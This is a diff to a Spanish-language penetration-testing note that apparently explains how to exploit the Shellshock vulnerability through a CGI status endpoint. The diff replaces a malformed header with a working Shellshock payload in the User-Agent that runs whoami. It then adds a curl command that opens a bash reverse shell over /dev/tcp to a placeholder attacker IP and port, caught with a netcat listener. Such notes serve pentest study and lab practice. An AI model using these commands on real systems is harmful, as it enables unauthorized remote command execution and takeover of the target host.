@@ -9,5 +9,12 @@ Podemos volver a enumerar la web apuntando a ese directorio y filtrando por exte
 
 Con los datos que obtengamos navegamos a ese archivo, si vemos que es una pagina dinámica que se actualiza cada cierto tiempo como por ejemplo un `/status` es que se esta ejecutando un comando a tiempo real.
 
-La forma de comprometerlo seria con un [[CURL]]
-`curl -s <IP_Objetivo/cgi-bin/status -H "User-Agent: () {:;];`
+La forma de comprometerlo seria con un [[CURL]]:
+`curl -s <IP_Objetivo/cgi-bin/status -H "User-Agent: () { :; }; echo; /usr/bin/whoami"`
+
+Si no nos reporta nada metemos un `echo;` de nuevo
+
+Para obtener una `reverseShell` usaremos lo siguiente después de probar antes con demás comandos:
+`curl -s <IP_Objetivo/cgi-bin/status -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<Ip_Atacante/puerto> 0>&1'"
+
+Poniéndonos en escucha antes de ejecutarlo con [[NETCAT]]
